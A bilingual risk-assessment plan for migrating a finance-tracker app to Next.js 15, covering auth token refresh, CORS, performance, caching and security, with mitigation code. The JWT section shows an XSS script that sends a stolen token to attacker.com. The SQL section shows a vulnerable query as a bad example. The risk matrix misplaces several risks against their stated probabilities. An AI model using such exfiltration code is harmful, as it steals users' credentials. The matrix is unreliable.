# TECH RISKS & MITIGATION — Finance Tracker V3
**Risk Assessment & Contingency Plans**

**Ngày:** 16/04/2026  
**Project Phase:** Pre-Migration Planning  
**Risk Level:** 🟡 Medium

---

## 🎯 RISK CATEGORIES

### 1. Migration Risks (React+Vite → Next.js 15)
### 2. API Integration Risks
### 3. Database & Performance Risks
### 4. Security Risks
### 5. Infrastructure Risks
### 6. Third-party Dependencies Risks

---

## 🔴 HIGH PRIORITY RISKS

### RISK #1: Next.js 15 Breaking Changes
**Category:** Migration  
**Probability:** 🟡 Medium (40%)  
**Impact:** 🔴 High

**Description:**
Next.js 15 có thể có breaking changes so với React Router 7 pattern hiện tại (RouterProvider, createBrowserRouter).

**Potential Issues:**
- Router API differences (App Router vs React Router)
- Server Components vs Client Components confusion
- Metadata API changes
- Middleware incompatibilities

**Mitigation:**
```typescript
// ✅ SOLUTION: Explicit "use client" directives
'use client';  // ← Add to all interactive components

// ✅ SOLUTION: Use Next.js Link instead of React Router Link
import Link from 'next/link';  // Next.js
// import { Link } from 'react-router';  // ❌ Old

// ✅ SOLUTION: Use useRouter from next/navigation
import { useRouter } from 'next/navigation';
// import { useNavigate } from 'react-router';  // ❌ Old
```

**Contingency Plan:**
- Keep prototype codebase in separate branch
- Incremental migration (component by component)
- Fallback: Continue with Vite if Next.js migration fails

**Status:** 🔴 Active monitoring

---

### RISK #2: Token Refresh Race Condition
**Category:** API Integration  
**Probability:** 🟡 Medium (50%)  
**Impact:** 🔴 High

**Description:**
Khi multiple requests fail với 401 đồng thời, có thể trigger multiple refresh token requests → token invalidation.

**Scenario:**
```
Request A → 401 → Refresh token
Request B → 401 → Refresh token (cùng lúc)
Request C → 401 → Refresh token (cùng lúc)
→ Backend sees 3 refresh requests → Revoke all tokens → User logged out
```

**Mitigation:**
```typescript
// ✅ SOLUTION: Token refresh queue
let refreshTokenPromise: Promise<string> | null = null;

apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;
      
      // If refresh is already in progress, wait for it
      if (!refreshTokenPromise) {
        refreshTokenPromise = refreshAccessToken()
          .finally(() => {
            refreshTokenPromise = null;
          });
      }
      
      const newToken = await refreshTokenPromise;
      error.config.headers.Authorization = `Bearer ${newToken}`;
      
      return apiClient(error.config);
    }
    
    return Promise.reject(error);
  }
);
```

**Contingency Plan:**
- Implement exponential backoff
- Add request deduplication
- Monitor error logs (Sentry)

**Status:** 🟡 Requires implementation

---

### RISK #3: CORS Issues (Development)
**Category:** API Integration  
**Probability:** 🔴 High (80%)  
**Impact:** 🟡 Medium

**Description:**
Frontend (localhost:3000) và Backend (localhost:8787) khác origin → CORS errors.

**Error Example:**
```
Access to fetch at 'http://localhost:8787/api/budget' from origin 'http://localhost:3000' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.
```

**Mitigation:**
```typescript
// ✅ SOLUTION 1: Backend CORS config (Hono.js)
import { cors } from 'hono/cors';

app.use('*', cors({
  origin: ['http://localhost:3000', 'https://app.budget-finance.com'],
  credentials: true,
  allowMethods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowHeaders: ['Content-Type', 'Authorization'],
}));
```

```typescript
// ✅ SOLUTION 2: Next.js rewrites (Development proxy)
// next.config.ts
export default {
  async rewrites() {
    return [
      {
        source: '/api/:path*',
        destination: 'http://localhost:8787/api/:path*',
      },
    ];
  },
};
```

**Contingency Plan:**
- Use Next.js API Routes as proxy (temporary)
- Deploy backend to same domain (api.budget-finance.com)

**Status:** 🟢 Known solution available

---

### RISK #4: Budget Calculation Performance
**Category:** Database & Performance  
**Probability:** 🟡 Medium (40%)  
**Impact:** 🔴 High

**Description:**
Budget calculation cần 5 queries riêng biệt → slow response time (>500ms).

**Current Approach:**
```typescript
// Query 1: Total Income
// Query 2: Total Expense
// Query 3: Fixed Costs
// Query 4: Goals Allocation
// Query 5: Emergency Buffer
// → Total: ~5 round trips to DB
```

**Mitigation:**
```typescript
// ✅ SOLUTION: Single query với UNION hoặc subqueries
const budgetData = await db.execute(sql`
  SELECT
    (SELECT COALESCE(SUM(amount), 0) FROM transactions 
     WHERE user_id = ${userId} AND type = 'income' AND ...) as totalIncome,
    (SELECT COALESCE(SUM(amount), 0) FROM transactions 
     WHERE user_id = ${userId} AND type = 'expense' AND ...) as totalExpense,
    (SELECT COALESCE(SUM(amount), 0) FROM bills 
     WHERE user_id = ${userId} AND is_active = 1 AND ...) as fixedCosts,
    (SELECT COALESCE(SUM(monthly_contribution), 0) FROM goals 
     WHERE user_id = ${userId} AND status = 'active' AND ...) as goalsAllocation,
    (SELECT emergency_buffer FROM user_settings 
     WHERE user_id = ${userId}) as emergencyBuffer
`);
```

```typescript
// ✅ SOLUTION 2: Redis caching
import { Redis } from '@upstash/redis';
const redis = Redis.fromEnv();

const cacheKey = `budget:${userId}:${month}`;
const cached = await redis.get(cacheKey);

if (cached) return cached;

const budgetData = await calculateBudget(userId, month);
await redis.set(cacheKey, budgetData, { ex: 300 }); // 5 min TTL
```

**Contingency Plan:**
- Add database indexes
- Implement materialized views (fallback)
- Scale database vertically

**Status:** 🟡 Requires load testing

---

## 🟡 MEDIUM PRIORITY RISKS

### RISK #5: Motion Animation Performance (Mobile)
**Category:** Frontend Performance  
**Probability:** 🟡 Medium (50%)  
**Impact:** 🟡 Medium

**Description:**
Spring animations từ Motion có thể lag trên low-end mobile devices.

**Mitigation:**
```typescript
// ✅ SOLUTION: Reduce motion for low-performance devices
import { useReducedMotion } from 'motion/react';

const shouldReduceMotion = useReducedMotion();

<motion.div
  animate={shouldReduceMotion ? {} : { y: -2, scale: 1.02 }}
>
```

```typescript
// ✅ SOLUTION 2: CSS-based animations fallback
.card {
  transition: transform 0.2s ease-out;
}

.card:hover {
  transform: translateY(-2px) scale(1.02);
}
```

**Status:** 🟢 Low priority

---

### RISK #6: React Query Cache Invalidation
**Category:** API Integration  
**Probability:** 🟡 Medium (60%)  
**Impact:** 🟡 Medium

**Description:**
Khi tạo transaction mới, Budget data cần được refresh ngay lập tức → stale data issue.

**Scenario:**
```
1. User adds transaction "Ăn sáng 30k"
2. Transaction created successfully
3. Dashboard still shows old Budget value (cached)
4. User confused → "Where is my transaction?"
```

**Mitigation:**
```typescript
// ✅ SOLUTION: Invalidate related queries on mutation
export function useCreateTransaction() {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: (data: CreateTransactionDTO) => 
      transactionsAPI.create(data),
    
    onSuccess: () => {
      // Invalidate all related queries
      queryClient.invalidateQueries({ queryKey: ['budget'] });
      queryClient.invalidateQueries({ queryKey: ['transactions'] });
      queryClient.invalidateQueries({ queryKey: ['analytics'] });
      
      // Or: Optimistic update
      queryClient.setQueryData(['budget', userId, month], (old: BudgetData) => ({
        ...old,
        totalExpense: old.totalExpense + newTransaction.amount,
        safeToSpend: old.safeToSpend - newTransaction.amount,
      }));
    },
  });
}
```

**Status:** 🟡 Requires implementation

---

### RISK #7: Image Upload Size (Receipts)
**Category:** Infrastructure  
**Probability:** 🟡 Medium (50%)  
**Impact:** 🟡 Medium

**Description:**
User upload ảnh receipt lớn (5MB+) → slow upload, expensive storage.

**Mitigation:**
```typescript
// ✅ SOLUTION: Client-side image compression
import imageCompression from 'browser-image-compression';

async function handleImageUpload(file: File) {
  // Compress before upload
  const options = {
    maxSizeMB: 1,
    maxWidthOrHeight: 1920,
    useWebWorker: true,
  };
  
  const compressedFile = await imageCompression(file, options);
  
  // Upload to Vercel Blob
  const { url } = await upload(compressedFile.name, compressedFile, {
    access: 'public',
    handleUploadUrl: '/api/upload',
  });
  
  return url;
}
```

**Contingency Plan:**
- Set file size limit (2MB)
- Use Cloudinary for auto-optimization

**Status:** 🟢 Low priority (MVP không có OCR)

---

## 🟢 LOW PRIORITY RISKS

### RISK #8: TypeScript Version Mismatch
**Category:** Dependencies  
**Probability:** 🟢 Low (20%)  
**Impact:** 🟢 Low

**Description:**
Next.js 15, Drizzle ORM, và các dependencies khác có thể require different TypeScript versions.

**Mitigation:**
```json
// ✅ SOLUTION: Pin TypeScript version
{
  "devDependencies": {
    "typescript": "5.4.5"  // ← Specific version
  },
  "resolutions": {
    "typescript": "5.4.5"
  }
}
```

**Status:** 🟢 Monitor only

---

### RISK #9: Tailwind CSS v4 Compatibility
**Category:** Migration  
**Probability:** 🟢 Low (30%)  
**Impact:** 🟢 Low

**Description:**
Tailwind CSS v4 có breaking changes so với v3.

**Known Changes:**
- CSS-first configuration (không dùng `tailwind.config.js`)
- Import directives thay đổi

**Mitigation:**
```css
/* ✅ SOLUTION: Use Tailwind v4 syntax */
@import "tailwindcss";

@theme {
  --color-primary: #4361ee;
  --radius: 0.625rem;
}
```

**Status:** 🟢 Already using Tailwind v4

---

### RISK #10: NLP Quick-Add Accuracy
**Category:** Third-party (OpenAI)  
**Probability:** 🟡 Medium (50%)  
**Impact:** 🟢 Low

**Description:**
OpenAI API parse sai input → transaction amount/category sai.

**Example:**
```
Input: "ăn sáng 30k"
Expected: { amount: 30000, type: 'expense', category: 'Ăn uống' }
Actual: { amount: 3000, type: 'income', category: 'Lương' } ❌
```

**Mitigation:**
```typescript
// ✅ SOLUTION: Confidence score + user confirmation
interface QuickAddResult {
  amount: number;
  type: 'income' | 'expense';
  category: string;
  confidence: number;  // 0-1
}

// Show preview before creating transaction
if (result.confidence < 0.8) {
  showConfirmationDialog({
    title: 'Kiểm tra lại thông tin',
    preview: result,
    onConfirm: () => createTransaction(result),
  });
}
```

**Contingency Plan:**
- Add manual edit step
- Fallback to regular form input

**Status:** 🟢 Feature không critical

---

## 🛡️ SECURITY RISKS

### RISK #11: JWT Token Exposure (localStorage)
**Category:** Security  
**Probability:** 🔴 High (90%)  
**Impact:** 🔴 High

**Description:**
Storing JWT trong localStorage vulnerable to XSS attacks.

**Attack Scenario:**
```javascript
// Malicious script injected via XSS
const token = localStorage.getItem('access_token');
fetch('https://attacker.com/steal', { 
  method: 'POST', 
  body: JSON.stringify({ token }) 
});
```

**Mitigation:**
```typescript
// ✅ SOLUTION 1: httpOnly cookies (requires backend on same domain)
// Backend sets cookie:
c.cookie('access_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60, // 15 minutes
});

// Frontend: Cookie auto-sent by browser
```

```typescript
// ✅ SOLUTION 2: Short-lived tokens + refresh rotation
// Access token: 15 minutes (stored in memory only)
// Refresh token: 7 days (httpOnly cookie)

let accessToken: string | null = null;  // In-memory storage

export const getAccessToken = () => accessToken;
export const setAccessToken = (token: string) => {
  accessToken = token;
};
```

**Additional Protection:**
- Content Security Policy (CSP) headers
- Input sanitization (React auto-escapes by default)
- Regular security audits

**Status:** 🔴 Critical - Requires decision

---

### RISK #12: SQL Injection via Drizzle ORM
**Category:** Security  
**Probability:** 🟢 Low (10%)  
**Impact:** 🔴 High

**Description:**
Drizzle ORM automatically parameterizes queries, nhưng raw SQL có thể vulnerable.

**Vulnerable Code:**
```typescript
// ❌ BAD: Raw SQL with user input
const email = req.body.email;
await db.execute(sql`SELECT * FROM users WHERE email = '${email}'`);
```

**Mitigation:**
```typescript
// ✅ GOOD: Parameterized query
const email = req.body.email;
await db.execute(sql`SELECT * FROM users WHERE email = ${email}`);
// Drizzle auto-parameterizes → Safe
```

```typescript
// ✅ GOOD: Query builder (safest)
await db.select().from(users).where(eq(users.email, email));
```

**Status:** 🟢 Low risk (following best practices)

---

### RISK #13: Rate Limiting Bypass
**Category:** Security  
**Probability:** 🟡 Medium (40%)  
**Impact:** 🟡 Medium

**Description:**
Attacker có thể bypass rate limiting bằng cách thay đổi IP (VPN, proxy).

**Mitigation:**
```typescript
// ✅ SOLUTION: Multi-factor rate limiting
import { Ratelimit } from '@upstash/ratelimit';

// Rate limit by userId (authenticated requests)
const userRateLimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(100, '1 m'),
});

// Rate limit by IP (unauthenticated requests)
const ipRateLimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'),
});

// Combine both
const userId = c.get('userId');
const ip = c.req.header('x-forwarded-for') || c.req.header('x-real-ip');

const { success: userSuccess } = await userRateLimit.limit(userId.toString());
const { success: ipSuccess } = await ipRateLimit.limit(ip!);

if (!userSuccess || !ipSuccess) {
  return c.json({ error: 'Rate limit exceeded' }, 429);
}
```

**Status:** 🟡 Requires implementation

---

## 📊 RISK MATRIX

```
            IMPACT
            Low    Med    High
          ┌──────┬──────┬──────┐
Prob High │  8   │  5   │ 11   │
          ├──────┼──────┼──────┤
Prob Med  │  9   │  6,7 │ 1,2  │
          ├──────┼──────┼──────┤
Prob Low  │  10  │      │  4   │
          └──────┴──────┴──────┘
```

**Priority Order:**
1. 🔴 RISK #11 (JWT exposure)
2. 🔴 RISK #2 (Token refresh race)
3. 🔴 RISK #1 (Next.js migration)
4. 🟡 RISK #4 (Budget performance)
5. 🟡 RISK #6 (Cache invalidation)

---

## ✅ RISK MITIGATION CHECKLIST

### Before Migration Starts
- [ ] Review all Next.js 15 breaking changes
- [ ] Setup error tracking (Sentry)
- [ ] Create rollback plan
- [ ] Document all API contracts

### During Development
- [ ] Implement token refresh queue
- [ ] Setup CORS correctly
- [ ] Add database indexes
- [ ] Implement React Query cache strategy
- [ ] Add rate limiting

### Before Production Deploy
- [ ] Load test Budget calculation
- [ ] Security audit (OWASP Top 10)
- [ ] Penetration testing
- [ ] Performance testing (Lighthouse)
- [ ] Backup strategy

### Post-Launch
- [ ] Monitor error rates (Sentry)
- [ ] Monitor API latency (Vercel Analytics)
- [ ] Monitor rate limit hits
- [ ] User feedback collection

---

## 🚨 CONTINGENCY PLANS

### If Next.js Migration Fails
**Fallback:** Continue with React + Vite
```typescript
// Keep prototype functional
// Deploy Vite build to Vercel/Netlify
// Use Next.js for backend API only (separate app)
```

### If Backend Performance Issues
**Fallback:** Add Redis caching layer
```typescript
// Cache Budget results for 5 minutes
// Cache transaction lists
// Implement background jobs for heavy calculations
```

### If Security Breach
**Action Plan:**
1. Revoke all refresh tokens
2. Force re-login for all users
3. Rotate JWT secret
4. Audit all access logs
5. Notify affected users

---

## 📋 RISK REVIEW SCHEDULE

| Phase | Review Date | Focus Areas |
|-------|-------------|-------------|
| Planning | 16/04/2026 | ✅ Complete |
| Migration | Week 1 end | Next.js compatibility |
| API Integration | Week 2 end | CORS, auth, caching |
| Performance | Week 3 end | Budget calculation, load testing |
| Security | Before production | Penetration testing, audit |
| Post-launch | Weekly | Error monitoring, performance |

---

**Last Updated:** 16/04/2026  
**Owner:** Tech Lead  
**Next Review:** After Migration Phase 1
